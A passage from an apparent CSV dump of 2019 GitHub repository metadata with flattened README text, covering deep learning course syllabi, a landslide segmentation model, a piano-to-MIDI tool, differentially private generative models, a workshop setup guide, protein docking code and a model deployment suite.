dlnlp2019 blob master slides probability pdf hw01 out Canvas Tues Sept 17 Probability III probslides https github com UBC NLP dlnlp2019 blob master slides probability pdf Thurs Sept 19 Information Theory infotheoryslides https github com UBC NLP dlnlp2019 tree master slides informationtheory pdf entropybasicsslides https github com UBC NLP dlnlp2019 tree master slides entropybackground pdf Tues Sept 24 ML Basics mlbasicsslides https github com UBC NLP dlnlp2019 tree master slides mlbasics pdf Thurs Sept 26 Word meaning I wordmeaningslides https github com UBC NLP dlnlp2019 tree master slides wordmeaning pdf hw01 due hw02 out Tues Oct 1 Word meaning II project discussion wordmeaningslides https github com UBC NLP dlnlp2019 tree master slides wordmeaning pdf Thurs Oct 3 Linear Algebra linalgnotebook https github com UBC NLP deeplearning nlp2018 blob master slides LinearAlgPresentation ipynb DLB CH02 https www deeplearningbook org contents linearalgebra html Tues Oct 8 Language models langmodelsslides https github com UBC NLP dlnlp2019 tree master slides langmodels pdf JMCH03 https web stanford edu jurafsky slp3 3 pdf Brown et al 1992 https www aclweb org anthology J92 1002 pdf Thurs Oct 10 Word embeddings word2vecslides https github com UBC NLP dlnlp2019 tree master slides word2vec pdf Mikolov et al 2013a https arxiv org pdf 1301 3781 pdf Mikolov et al 2013b https www aclweb org anthology N13 1090 pdf Bojanowski et al 2017 https www mitpressjournals org doi pdf 10 1162 tacla00051 Tues Oct 15 Feedforward Networks ffslides https github com UBC NLP dlnlp2019 tree master slides feedforwardnets pdf DLB CH06 https www deeplearningbook org contents mlp html Thurs Oct 17 Recurrent Neural Networks RNNslides https github com UBC NLP dlnlp2019 tree master slides RNN pdf DLB CH10 https www deeplearningbook org contents rnn html Tues Oct 22 RNNs II RNNslides https github com UBC NLP dlnlp2019 tree master slides RNN pdf Thurs Oct 24 GRUs LSTMs grulstmslides https github com UBC NLP dlnlp2019 tree master slides grulstm pdf Chung et al 2014EmpiricalEvalGRU https arxiv org pdf 1412 3555 pdf hw02 due Tues Oct 29 Applications applicationsslides https github com UBC NLP dlnlp2019 tree master slides applications pdf Thurs Oct 31 Generation Neural Fake News neuralfakenewsslides https github com UBC NLP dlnlp2019 tree master slides neuralfakenews pdf Tues Nov 5 Gradient based optimization optimizationslides https github com UBC NLP dlnlp2019 tree master slides optimization pdf hw03a due Thurs Nov 7 Backpropagation backpropagationslides https github com UBC NLP dlnlp2019 tree master slides backpropagation pdf Tues Nov 12 Seq2Seq Neural Machine Translation attentionMTslides https github com UBC NLP dlnlp2019 tree master slides attention pdf Bahdanauetal2016 https arxiv org pdf 1409 0473 pdf Thurs Nov 14 Transformer I transformerslides https github com UBC NLP dlnlp2019 tree master slides transformer pdf Vaswanietal2017 https papers nips cc paper 7181 attention is all you need pdf Devlinetal2019 https www aclweb org anthology N19 1423 pdf Tues Nov 19 Transformer II BERT same as last week Thurs Nov 21 ConvNets cnnslides https github com UBC NLP dlnlp2019 tree master slides CNNs pdf DLB CH09 https www deeplearningbook org contents convnets html Tues Nov 26 Auto Encoders GANS Multi Task Learning and Word Mapping methodsoverviewslides https github com UBC NLP dlnlp2019 tree master slides multiplemethods pdf variationalautoencodersslides https github com UBC NLP dlnlp2019 tree master slides variationalautoencoders pdf DLB CH20 10 3 https www deeplearningbook org contents generativemodels html Semi supervised sequence learning www cs ubc ca amuham01 LING530 papers dai2015semi pdf DiaNet https arxiv org pdf 1910 14243 pdf Word Translation Without Parallel Data https arxiv org pdf 1710 04087 pdf Improving neural machine translation mod els with monolingual data https www aclweb org anthology P16 1009 pdf Thurs Nov 28 Projects Tues Dec 3 Final project due hw03b 8 Readings See Section 7 above Additionally below is list of relevant interesting background papers This list will grow soon Where to find good papers ACL Anthology https www aclweb org anthology NeurIPS 2019 papers https nips cc Conferences 2019 AcceptedPapersInitial NeurIPS 2018 proceedings http papers nips cc book advances in neural information processing systems 31 2018 ICLR 2019 https iclr cc Conferences 2019 Schedule type Poster ICLR 2018 https dblp org db conf iclr iclr2018 AAAI Digital Library https www aaai org Library conferences library php Attention Learning to Deceive with Attention Based Explanations https arxiv org pdf 1909 07913 pdf What Does BERT Look At An Analysis of BERTs Attention https arxiv org pdf 1906 04341 pdf Analyzing the Structure of Attention in a Transformer Language Model https arxiv org pdf 1906 04284 pdf Is Attention Interpretable https arxiv org pdf 1906 03731 pdf Graph Attention Networks https arxiv org pdf 1710 10903 pdf Attention is not Explanation https www aclweb org anthology N19 1357 pdf MT Towards Understanding Neural Machine Translation with Word Importance https arxiv org pdf 1909 00326 pdf An Exploration of Placeholding in Neural Machine Translation https www aclweb org anthology W19 6618 BLEU a Method for Automatic Evaluation of Machine Translation https www aclweb org anthology P02 1040 Learning Phrase Representations using RNN EncoderDecoder for Statistical Machine Translation https arxiv org pdf 1406 1078 pdf Semi Supervised Learning for Neural Machine Translation https arxiv org pdf 1606 04596 pdf Self Supervised Neural Machine Translation https www aclweb org anthology P19 1178 MTL Cross lingual Dependency Parsing with Unlabeled Auxiliary Languages https arxiv org pdf 1909 09265 pdf Word Mapping Various topics Toward controlled generation of text http www cs ubc ca amuham01 LING530 papers hu2017toward pdf Tutorial on variational autoencoders http www cs ubc ca amuham01 LING530 papers doersch2016tutorial pdf Adversarially Regularized Autoencoders http www cs ubc ca amuham01 LING530 papers zhao2018adversarially pdf Joint Embedding of Words and Labels for Text Classification http www cs ubc ca amuham01 LING530 papers wang2018joint pdf Learning Adversarial Networks for Semi Supervised Text Classification via Policy Gradient http www cs ubc ca amuham01 LING530 papers li2018learning pdf Realistic Evaluation of Semi Supervised Learning Algorithms http www cs ubc ca amuham01 LING530 papers oliver2018realistic pdf Improving language understanding by generative pre training http www cs ubc ca amuham01 LING530 papers radford2018improving pdf Automatic Stance Detection Using End to End Memory Networks http www cs ubc ca amuham01 LING530 papers mohtarami2018automatic pdf Neural Machine Translation by Jointly Learning to Align and Translate http www cs ubc ca amuham01 LING530 papers bahdanau2014neural pdf Grammar as a foreign language http www cs ubc ca amuham01 LING530 papers vinyals2015grammar pdf Deep Models for Arabic Dialect Identification on Benchmarked Data http www cs ubc ca amuham01 LING530 papers elarabyDeepModels2018 pdf A Neural Model for User Geolocation and Lexical Dialectology http www cs ubc ca amuham01 LING530 papers rahimiGeoloc2017 pdf Deep Contextualized Word Representations http www cs ubc ca amuham01 LING530 papers petersELMo2018 pdf Emonet Fine grained emotion detection with gated recurrent neural networks http www cs ubc ca amuham01 LING530 papers mageedEmoNet2017 pdf Is statistical machine translation approach dead http www cs ubc ca amuham01 LING530 papers menacer2017statistical pdf Neural machine translation and sequence to sequence models A tutorial http www cs ubc ca amuham01 LING530 papers neubig2017neural pdf Adversarial training methods for semi supervised text classification http www cs ubc ca amuham01 LING530 papers miyato2016adversarial pdf Learned in translation Contextualized word vectors http www cs ubc ca amuham01 LING530 papers mccann2017learned pdf Semi supervised sequence learning http www cs ubc ca amuham01 LING530 papers dai2015semi pdf Auto encoding variational bayes http www cs ubc ca amuham01 LING530 papers kingma2013auto pdf Sentiment Transfer using Seq2Seq Adversarial Autoencoders http www cs ubc ca amuham01 LING530 papers singh2018sentiment pdf Variational Autoencoder for Semi Supervised Text Classification http www cs ubc ca amuham01 LING530 papers xu2017variational pdf Phrase Based,2019-08-31T19:02:32Z,2019-11-29T19:04:03Z,n/a,UBC-NLP,Organization,1,6,0,86,master,mageed,1,0,0,1,0,0,0
zhoukaisheng,Landslide-Susceptibility,deep-learning#landslide-susceptibility-mapping#slope-unit,Landslide Susceptibility SlopeCardMake py tiffid fid npy1D SlopeCardResize py rezisenpy dataread py nnitrial nni First installing Requirements Second cd nnitrial Last nnictl create config config yml Requirements keras nni pandas numpy matplotlib,2019-09-09T11:06:05Z,2019-12-10T06:51:34Z,Python,zhoukaisheng,User,1,6,0,25,master,zhoukaisheng,1,0,0,1,0,0,0
xupine,DFPENet,n/a,DFPENet The overview of DFPENet DFPENet png Evaluation the model on the ISPRS Vaihingen dataset Imp Surf Build Low veg Tree Car Mean F1 mIoU OA DFPENet https pan baidu com s 17IeiF87qQZPl9yjv8vNXQ 89 79 93 52 79 32 86 67 77 99 85 46 75 10 87 61 DFPENet Pre trained Datasets https pan baidu com s 1ZExwMqggLb33FJ7V AtluQ 92 77 95 53 86 38 90 71 81 17 89 31 81 06 91 38 DFPENet geology Process flow of the recognition scheme for co seismic landslides DFPENet Geology png The proposed scheme is applied to two earthquake triggered landslides in Jiuzhaigou China and Hokkaido Japan The scheme evaluated on the earthquake triggered Jiuzhaigou landslides https pan baidu com s 1KeFKTCDff1nSmRqAfI286A Category Precision Recall mIoU Accuracy Validation set 91 09 91 46 83 95 Final results 99 97 98 70 98 67 The transfer learning scheme evaluated on the earthquake triggered Hokkaido landslides https pan baidu com s 1lEkSMMe7RmHgwRAFTyHi1g Category Precision Recall mIoU Accuracy Validation set 84 28 90 20 77 21 Citation If you use this code for your research please cite our papers This will be updated when the paper is published articleXu2019DFPENet geology title DFPENet geology A Deep Learning Framework for High Precision Recognition and Segmentation of Co seismic Landslides author Qingsong Xu Chaojun Ouyang Tianhai Jiang Xuanmei Fan Duoxiang Cheng journal arXiv preprint arXiv 1908 10907 year 2019 Utilizing our schemes to accomplish recognition tasks for other seismic landslides is highly welcomed,2019-08-28T00:52:39Z,2019-12-11T09:55:53Z,Jupyter Notebook,xupine,User,1,6,1,14,master,xupine,1,0,0,1,0,0,0
skyil7,Piano2Midi,ai#deeplearning#maestro#magenta#music#piano#tensorflow,Piano 2 Midi If you want English README md Click here READMEEN md Introduction Piano 2 Midi WAV MID How to use exe 1 2 https storage googleapis com magentadata models onsetsframestranscription maestrocheckpoint zip 3 pip pip install upgrade tensorflow pip install magenta 4 Piano2Midi py 5 mid Magenta Library Tensorflow Magenta https github com tensorflow magenta onsetsframestranscription https github com tensorflow magenta tree master magenta models onsetsframestranscription Magenta Maestro https magenta tensorflow org datasets maestro https magenta tensorflow org maestro wave2midi2wave License Magenta Apache License 2 0 Maestro Apache License 2 0 Update Plan Midi 2 Piano Maestro midi wav,2019-08-22T14:01:02Z,2019-11-22T03:22:21Z,Python,skyil7,User,1,6,0,3,master,skyil7,1,0,0,0,0,0,0
SAP-samples,security-research-differentially-private-generative-models,dp-gans#dp-vae#sample#sample-code#security,Differentially Private Generative Models Description This repository explains how generative models can be used in combination with differential privacy to synthetize feature rich realistic categorical datasets in a privacy preserving manner It brings two jupyter notebooks for dp GANs differentially private Generative Adversarial Networks and dp VAE Variational Autoencoder to generate new data in a differetnial private mode The code allows to quickly generate new dataset incl numerical features in private or public mode dpSGD and dpAdam optimizers from tensowflow privacy library https github com tensorflow privacy are used these models Requirements Python https www python org Jupyter https jupyter org Tensorflow https github com tensorflow Pandas keras and more see the notebooks import sections H2O AutoML http docs h2o ai h2o latest stable h2o docs automl html Check further dependencies in the Jupyter notebooks Tutorialdp GAN ipynb and Tutorialdp VAE ipynb Download the tensorflow privacy project 1 Clone Tensorflow privacy into this project repository git clone https github com tensorflow privacy cd privacy pip install e 2 Open the notebooks in Jupyter and run them Authors Contributors Lyudmylla Dymytrova Lorenzo Frigerio Anderson Santana de Oliveira Known Issues No issues known How to obtain support This project is provided as is and any bug reports are not guaranteed to be fixed Citations If you use this code in your research please cite articleDBLP journals corr abs 1901 02477 author Lorenzo Frigerio and Anderson Santana de Oliveira and Laurent Gomez and Patrick Duverger title Differentially Private Generative Adversarial Networks for Time Series Continuous and Discrete Open Data journal CoRR volume abs 1901 02477 year 2019 url http arxiv org abs 1901 02477 archivePrefix arXiv eprint 1901 02477 timestamp Fri 01 Feb 2019 13 39 59 0100 biburl https dblp org rec bib journals corr abs 1901 02477 bibsource dblp computer science bibliography https dblp org References 1 Lorenzo Frigerio Anderson Santana de Oliveira Laurent Gomez Patrick Duverger Differentially Private Generative Adversarial Networks for Time Series Continuous and Discrete Open Data CoRR abs 1901 02477 2019 https arxiv org abs 1901 02477 License This project is licensed under SAP Sample Code License Agreement except as noted otherwise in the LICENSE file LICENSE,2019-08-21T22:33:31Z,2019-12-05T00:15:00Z,Jupyter Notebook,SAP-samples,Organization,2,6,0,3,master,aso000,1,0,0,0,0,0,0
stephencwelch,dl-workshop,n/a,Deep Learning Workshop graphics workshoplander gif Sessions Session Key Topics Additional Reading Viewing A Brief History of Neural Networks Setup Perceptrons multilayer Perceptrons neural networks the rise of deep learning getting your environment setup Goodfellow Deep Learning Chapter 1 https www deeplearningbook org contents intro html Ai The Tumultuous History Of The Search For Artificial Intelligence https www amazon com Ai Tumultuous History Artificial Intelligence dp 0465029973 ref sr12 keywords history of ai qid 1566813741 s books sr 1 2 Neural Networks Demystified The mechanics and mathematics for forward and backpropagation in neural networks Overfitting Regularization Neural Networks Demystified YouTube Series https www youtube com watch v bxe2T V8XRs Introduction to Pytorch Why Pytorch Pytorch as Numpy with GPU Support simple neural network in Pytorch automatic differentiation nn Module PyTorch layers PyTorch Optim nn Sequential Great Torch Intro by Jeremy Howard https pytorch org tutorials beginner nntutorial html Modern Deep Learning Practices Stochastic gradient descent regression vs classification one hot encoding cost functions and maximum likelihood cross entropy CNNs pooling and strides AlexNet walkthrough ImageNet transfer learning adaptive pooling dropout data augmentation a little historical perspective Ian Goodfellow s Deep Learning Chapter 1 Section 6 2 and Section 8 1 https www deeplearningbook org Get results fast with fastai Jeremy Howard and the fastai philosophy DataBunches Learners NLP with fastai world class computer vision with fastai fastai course https github com fastai course v3 GANs Ian Goodfellow invents GANs the world s simplest GAN nash equilibria a dive into higher dimensions DCGAN to the rescue Visualizing GANs GAN grow up sortof StyleGAN insanity the unbelievably interesting world of GAN variants Viewing Notebooks You will be able to view most notebooks directly in github This works pretty well except html won t render embedded slide shows unfortunately The best way to view the notebooks is to clone this repo and run them yourself Checkout the setup instructions below Note on Launching the Jupyter Notebooks To properly view the images and animations please launch your jupyter notebook from the root directory of this repository Downloading Animations An number of notebooks in the workshop use large animation files To keep this repo relaitvely lightweight we ve stored these videos on a seperate server They can be downloaded here http www welchlabs io dl workshop videos zip and should be placed in a directory called videos in the top level of this repo You can also automatically download videos with this script python getandunpack py url http www welchlabs io dl workshop videos zip Preparing for this Workshop 1 Setting up your computer in advance You may want to configure your python environment on your local machine before the workshop Instructions for this are in the github readme You can test your environment by running this notebook 2 Materials Were not assuming that you will do any specific prep for this workshop That said our group has a wide range of skills backgrounds so if youre new to some of the concepts in the itinerary a little preparation may help you get more out of our time tomorrow For a little background on some of the neural networks principles well be covering you may want to check out my neural networks YouTube series https www youtube com watch v bxe2T V8XRs Jeremy Howards fastai lectures https course fast ai videos lesson 1 are also a terrific starting point Finally there is one excellent book https www deeplearningbook org and only one in my opinion on deep learning from Ian Goodfellow Its available online for free and very readable Chapter 1 is a great place to start if youre new Jupyter Hub We ve setup a Jupyter Hub instance for this workshop to allow GPU access and provide access to a preconfigured environment By connecting to Jupyter Hub you will not need to setup up an environment Go to either of these links active during workshop Link to Jupyter Hub Server 1 http 104 41 135 15 Link to Jupyter Hub Server 2 http 40 71 85 174 Link to Jupyter Hub Server 3 http 13 82 217 198 At login use the first part of your email e g firstpart ignorethispart com and create your password graphics jupyterhub1 png Next click New and select Python 3 graphics jupyterhub2 png This will create a notebook for you to work in graphics jupyterhub3 png Once you are logged in please open a terminal directly available in JupyterHub and clone this respository Setting Up Your Environment Locally After cloning this repo to your local machine you ll need to setup your Python environment and dependencies The Python 3 Anaconda Distribution https www anaconda com download is the easiest way to get going with the notebooks and code presented here Optional You may want to create a virtual environment for this repository conda create n dl workshop python 3 conda activate dl workshop You ll need to install the jupyter notebook to run the notebooks conda install jupyter You may also want to install nbconda Enables some nice things like change virtual environments within the notebook conda install nbconda PyTorch and fastai You should be able to install pytorch and fastai with the single command conda install c pytorch c fastai fastai If you run into issues you may try to install fastai and pytorch via pip pip install torch torchvision pip install fastai This repository requires the installation of a few extra packages you can install many of them all at once with pip install r requirements txt opencv We ll occasionally use opencv you can install with conda pip install opencv python Optional jupyterthemes https github com dunovank jupyter themes can be nice when presenting notebooks as it offers some cleaner visual themes than the stock notebook and makes it easy to adjust the default font size for code markdown etc You can install with pip pip install jupyterthemes Recommend jupyter them for presenting these notebook type into terminal before launching notebook jt t grade3 cellw 90 fs 20 tfs 20 ofs 20 dfs 20 Recommend jupyter them for viewing these notebook type into terminal before launching notebook jt t grade3 cellw 90 fs 14 tfs 14 ofs 14 dfs 14 Jupyterthemes also includes some nice dark options jt t oceans16 Finally you can reset to the standare notebook with jt r,2019-08-26T09:39:38Z,2019-09-03T14:28:44Z,Jupyter Notebook,stephencwelch,User,2,5,5,24,master,stephencwelch#josiahls,2,0,0,0,0,0,1
lupoglaz,DeepLocalProteinDocking,n/a,DeepLocalProteinDocking Requirements 1 PyTorch 1 1 2 TorchProteinLibrary https github com lupoglaz TorchProteinLibrary commit 16166ce4847ad3ba95cd5afdb8bb4503cad32caa 3 SE3CNN https github com mariogeiger se3cnn Step by step instructions Training dataset 13Gb https drive google com open id 1QVl2yvgyV Tk OMQBU Ry44th0o1HajO Training logs 39Mb https drive google com open id 1tq6cPKAadwVkiIFptP GRaNClhdiv Preprocessed Docking Benchmark V4 50Mb https drive google com open id 11cOfN0cd9qyi8W3tPBbUWjoYTlHxKgl Preprocessed Docking Benchmark V5 50Mb https drive google com open id 1XBCiSpa3aeCzErGfl58HVSByVL3Cdc8 Precomputed results 1 Chose some directories where you will store your data In the file src init py change the storagedir for the local machine 2 Download the dataset and unpack it in the storagedir The directories configuration should look like storagedir LocalDockingDataset 3 Download logs and models and unpack it in the storagedir move the folders DPDexperiments and DPDmodels to the storagedir 4 Download preprocessed benchmarks and store them in your storagedir LocalDockingDataset Main point of interest are directories Matched in these benchmarks They contain matched chains between bound and unbound structures For more details see here scripts Dataset README md Your storagedir should look like storagedir LocalDockingDataset storagedir LocalDockingDataset DockingBenchmarkV4 storagedir LocalDockingDataset DockingBenchmarkV5 storagedir DPDexperiments storagedir DPDmodels Generating your own dataset If you want to make your own dataset follow intruction in the scipts Dataset scripts Dataset README md directory The whole process takes around 2 3 days also there might be some inconsistencies with the directories If you find that it does not work please submit an issue https github com lupoglaz DeepLocalProteinDocking issues Code structure 1 Dataset loaders can be found in src Dataset directory We use two loaders one for the generated dataset and one for the DockingBenchmark 2 Models are defined in src Models They are split into Protein Representation Models and Docking Models Additionally here one can find the ranking loss function and volume multiplication modules 3 Training iteration is defined in src Training LocalTrainer py 4 Docking iteration is defined in src Docker Docker py Main scripts for training and testing are src trainlocal py and src testlocal py Training and testing parameters we used in the paper can be found in src servertrainlocal sh and src servertestlocal sh 5 Rotations loading and circular volume plotting can be found in src Utils We used rotation generated by https mitchell lab biochem wisc edu SOI index php that can be found in data directory However they have different license than this repository Be sure to obtain the license from MitchellLab Training a model Trainig a model from scratch takes around 4 5 days on TitanX Maxwell To launch the scripts change the directory to src and run localtrain py with the appropriate parameters An example of the training parameters can be found in servertrainlocal sh Evaluating a model To evaluate a model on the benchmark head to src and run localtest py with the appropriate parameters The evaluation takes 3 days on 5 nodes using K40 GPU We did not evaluate docking of the bound structures In case you would like to do this experiment change lines 62 and 63 in the file src localtest py to pass bound structures to the docker An example of the testing parameters can be found in servertestlocal sh Plotting the results The instruction on how to plot the results are here scripts Results README md Citing this work bibtex article Derevyanko738690 author Derevyanko Georgy and Lamoureux Guillaume title Protein protein docking using learned three dimensional representations elocation id 738690 year 2019 doi 10 1101 738690 publisher Cold Spring Harbor Laboratory URL https www biorxiv org content early 2019 08 19 738690 eprint https www biorxiv org content early 2019 08 19 738690 full pdf journal bioRxiv,2019-08-13T21:42:07Z,2019-11-28T01:27:34Z,Python,lupoglaz,User,2,5,6,22,master,lupoglaz,1,0,0,0,0,0,0
OneClickDeepLearning,OneClickDeepLearning,n/a,Introduction Architecture Capsul Rover Launcher Cost Estimation Getting started license https img shields io github tag pre BoyuHuo OCDL Image svg license https img shields io badge license Apache2 0 blue svg license https img shields io docker pulls wbq1995 app svg license https img shields io github release date Tann chen OneClickDLTemp svg Introduction OCDL One Click Deep Learning is an open source suite of tools for composing connections of models data hybrid clouds computers and devices for deep learning It builds a bridge between abundant models data computing infrastructure and software platforms which enable users accelerate their completion testing and deployment of Deep Learning project The entire tool set consist three parts Capsule Capsule is a lightweight web application which offered all the portals such as model development centralized configuration for the whole environment It can be considered as the jupyter notebook with tons of extensions for deep learning project Rover Rover is a middleware which provides distributed computing resources and distributed file system for OCDL Once Rover receives resource request from Capsule it will assign a CPU or GPU resource according to the requested resource type User could upload data to our distributed file system and access to it at memory speed Launcher Launcher builds a workflow from mature models which automatically publish model to the thousands of clients As long as Users correctly set up the Git Repository URL in the Project configuration publish a model will be just One click Architecture It builds a workflow from trained models which automatically publish model to the thousands of clients Capsule Download Tutorial https github com OneClickDeepLearning OneClickDeepLearning raw dev tutorials OCDL Capsule 20 20Baiyu pptx capsule ppt Facilitate the process of model development Capsule embedding the Jupiter IDE into the website as well as the code templates which contains most popular code samples such as layers neural network and networks So it boosts the whole process of model development of senior developer and also reduces the learning curve of junior developers Centralized and Customized to adopt different projects and environment Capsule allows you to customize your project architecture by combining it with OCDL Rover and Launcher and cooperate with them to present a better machine learning environment The only thing you need to do for setting up the whole environment is to finish your configuration through a centralized configuration portal Flexible efficient and stateless The OCDL Capsule is a lightweight Java web applicationwhich means the only environment requirement is JVM There is no reliable plugins no database and even noconfiguration file in the Capsule Whats more the Capsuleis also very flexible since it supports you to deploy multiple Capsules in one Rover and Launcher which could makeyour resource more reusable Rover Download Tutorial https github com OneClickDeepLearning OneClickDeepLearning raw dev tutorials OCDL Rover Boqian pptx capsule ppt Application containerization Our applications such as Jupyter Notebook is containerized with docker This means our application can be deployed more rapidly easily safely and platform independently Cross cloud resources integration Our computing resources are Heterogeneous For example our CPU and GPU clusters can be composed of Amazon EC2 instances Azure instances or even local machines Cross cloud resources integration enables us to make full use of our computing resources and enhance resource scalability Clusters management Our containerised applications on GPU and CPU clusters are deployed scaled and managed by Kubernetes Kubernetes provides advanced scheduler to launch container on cluster nodes automatically It also provides self healing capabilities which can reschedule replace and restart the dead containers These features make our clusters more robust and efficient File system We provide Hadoop HDFS as underlying file system allowing users to store large files HDFS itself is robust and scalable Since it can be inefficient for HDFS to access data we use Alluxio on top of HDFS which enables us to access data at memory speed Launcher Download Tutorial https github com OneClickDeepLearning OneClickDeepLearning raw dev tutorials OCDLDeployment0908 pptx launcher ppt Model Center Model Center is a model management module that we designed ourselves In Model Center Manager could easily approve or reject a model that submitted by developer Once the manager clicked the button APPROVE it will start the process of automated model deployment We also allow Manager to customize their own Algorithm The different categories model they want to publish and manager could publish the model to a specific Algorithm and the system will auto assign a version according the managers choice Automated Deployment The implementation of Auto Deployment like a pipe lines The physical model file will be pushed to Git Repo after the Manager approve it then it will be push again to the S3 and waiting the Client to download Between these movement Jenkins and Kafka play important connection roles When model is pushed to Git Repo it will trigger Jenkins and send the massage to push the model to S3 after model upload to S3 another Kafka message that including model download URL will send to the Client We also trying to add a testing tool at the Jenkins before uploading the model to S3 but it will be the future effort Lets combinate these two part and think about the process of model publishing as long as you correctly set the Git Repository URL in the Project configuration publish a model will be just One click Experiment Cost Estimation Sample projects NLP for Metropolitan Residence Request Classification Medical Image Lesion Segmentation Time Series Forecasting for Cloud Service Workload Development Contributing If you are a new contributor see Steps to Contribute https github com prometheus prometheus blob master CONTRIBUTING md steps to contribute If you have a trivial fix or improvement go ahead and create a pull request addressing with a suitable maintainer of this repository see MAINTAINERS md https github com prometheus prometheus blob master MAINTAINERS md in the description of the pull request If you plan to do something more involved first discuss your ideas on our mailing list https groups google com forum fromgroups forum prometheus developers This will avoid unnecessary work and surely give you and us a good deal of inspiration Also please see our non goals issue https github com prometheus docs issues 149 on areas that the Prometheus community doesn t plan to work on Relevant coding style guidelines are the Go Code Review Comments https code google com p go wiki wiki CodeReviewComments and the Formatting and style section of Peter Bourgon s Go Best Practices for Production Environments https peter bourgon org go in production formatting and style Team Principle investigator Yan Liu yan liu concordia ca Developers Tianen Chen Baiyu Huo bhuo encs concordia ca Boqian Wang wboqian encs concordia ca Ivy Ling lzhijin encs concordia ca Data scientists Jincheng Su sjinche encs concordia ca Huazhi Liu Yushi Jing Userful Link Bootstrapping clusters with kubeadm Schedule GPUs CUDA and cuDNN images Kafka Setting Refer to CONTRIBUTING md https github com prometheus prometheus blob master CONTRIBUTING md,2019-09-15T16:16:36Z,2019-11-16T10:38:54Z,JavaScript,OneClickDeepLearning,User,0,5,3,1011,master,BoyuHuo#IvyLingZhijing#WBQ1995#Tann-chen#OneClickDeepLearning#Jincheng-Sun,6,1,1,5,3,0,28
tjwei,NCTU_DeepLearning,n/a,NCTUDeepLearning Text Book https www deeplearningbook org Mentioned software python numpy sklearn tensorflow keras google colab Week01 Week02 Introduction and Feedforward networks slides https drive google com a nctu edu tw file d 1VTuiNdYzNJ6KRDWKPI6B lVUNhZwKKF1 view usp sharing https drive google com a nctu edu tw file d 1mQgQlqh2x3MgrOCBt7XMYG4nw29upGyR view usp sharing https drive google com file d 1gpG9 btRo0LyLn8r8aaOozo0eOvgPMKh view usp sharing Coursework submit form https docs google com forms d e 1FAIpQLScGgaTCzsXwxhuxizLduURIBNGlOgedYCOb5gkJYwsHoAouRA viewform Please submit ipynb files Use nearest neighbor method to do handwritten digit recognition Optional Use PCA to speed up the above method Handcraft a feedforward neural network that solves the problem of input a binary representation of a number and classify by it s remainder when divided by 4 with 100 accuracy input a binary representation of a number and classify by it s remainder when divided by 3 with high accuracy input is a 3x3 board each cell is either white or black Check whether there are any 3 white cell are in a row like the game tic tac toe See https github com tjwei CrashCourseML BasicML 01 From NumPy to MNIST ipynb DIYNN 01 FeedForward Forward Propagation ipynb Week03 Cost function and Gradient Descent ipynb https github com tjwei CrashCourseML blob master DIYNN 02 FeedForward Backpropagation ipynb Ian Goodfellow s slides http www deeplearningbook org slides sgdandcoststructure pdf Coursework use new E3 to submit your work Use numpy to write simple neural networks and use a gradient descent algorithm to train it for classifying digits in the MNIST dataset Using cross entropy loss Using mean square error loss Week04 CNN and Using tensorflow 2 0 Train a neural network to classify digits in the MNIST dataset Train a neural netowork to classify classes in the cifar10 dataset Week05 Convolution and convolution transpose Handcraft a CNN network to generate the next step of the game of life Week06 More Techniques gradient descent based optimizers http ruder io optimizing gradient descent index html Batch normalization https en wikipedia org wiki Batchnormalization https arxiv org pdf 1502 03167v3 pdf Overfitting Dropout http jmlr org papers volume15 srivastava14a srivastava14a pdf network in network https arxiv org pdf 1312 4400 pdf Resnet https arxiv org pdf 1512 03385 pdf Week07 Optimization RNN http www deeplearningbook org contents optimization html http www deeplearningbook org contents rnn html https colah github io posts 2015 08 Understanding LSTMs https www tensorflow org tutorials text textclassificationrnn Week09 Applications slides Deep Learning Week 09 pdf Deep 20Learning 20Week 2009 pdf Week12 Reinforcement Learning Book http incompleteideas net book bookdraft2017nov5 pdf Week13 Deep Reinforcement Learning An Introduction to Deep Reinforcement Learning https arxiv org pdf 1811 12560 pdf slides https www slideshare net BigDataColombia an introduction to deep reinforcement learning https www cse cuhk edu hk irwin king media presentations introduction2drl pdf Playing Atari with Deep Reinforcement Learning https www cs toronto edu vmnih docs dqn pdf Double DQN https www aaai org ocs index php AAAI AAAI16 paper download 12389 11847 Dueling Network Architectures http proceedings mlr press v48 wangf16 pdf Ditributional DQN A Distributional Perspective on Reinforcement Learning https arxiv org abs 1707 06887 Distributional Reinforcement Learning with Quantile Regression https arxiv org abs 1710 10044 An Analysis of Categorical Distributional Reinforcement Learning https arxiv org abs 1802 08163 Week14 Generative Adversarial Networks https github com tjwei GANTutorial slides https drive google com open id 1 Gat7n6s03mmJnaJIdRgs7XCg0U Week16 Pretraining and Transfer Learning Deep Dream https en wikipedia org wiki DeepDream Adversarial Example https pytorch org tutorials beginner fgsmtutorial html Neural style transfer Original Paper https www cv foundation org openaccess contentcvpr2016 html GatysImageStyleTransferCVPR2016paper html Perceptual loss https cs stanford edu people jcjohns papers eccv16 JohnsonECCV16 pdf Instance Normalizatoin https arxiv org abs 1607 08022 Adaptive Instance Normalization https arxiv org abs 1703 06868 https arxiv org pdf 1705 08086 pdf Review https ieeexplore ieee org stamp stamp jsp arnumber 8732370 Week17 Variational Autoencoders Tutorial on Variational Autoencoders https arxiv org abs 1606 05908 Vector Quantized Variational Autoencoders https arxiv org abs 1711 00937 VQ VAE 2 https arxiv org abs 1906 00446,2019-09-08T13:06:28Z,2019-12-09T05:40:05Z,Jupyter Notebook,tjwei,User,1,5,2,35,master,tjwei,1,0,0,0,1,0,0
hzdr,d3hack2019-docs,n/a,Dresden Deep Learning Hackathon 2019 Technical Documentation This repo contains hints and documentation to help teams participate in the d3hack2019 https indico mpi cbg de e d3hack2019 Topics covere are the infrastructure offered tips and tricks applying machine learning and potentially other helpful information to make each team as productive as possible Feel free to open issues send PRs or contribute in any other way to this material Compute Infrastructure During the hackathon we offer 2 main hardware resources that participants and mentors are free to use 1 AWS Sagemaker Notebooks compute aws README md 2 Taurus HPC cluster compute taurus README md Machine Learning Partition LICENSE All markdown documents are licensed under CC BY 4 0 https creativecommons org licenses by 4 0 legalcode,2019-08-29T11:34:52Z,2019-09-25T10:02:29Z,n/a,hzdr,Organization,2,5,4,42,master,psteinb#jkelling#tneumann#tobiashuste,4,0,0,1,5,1,5
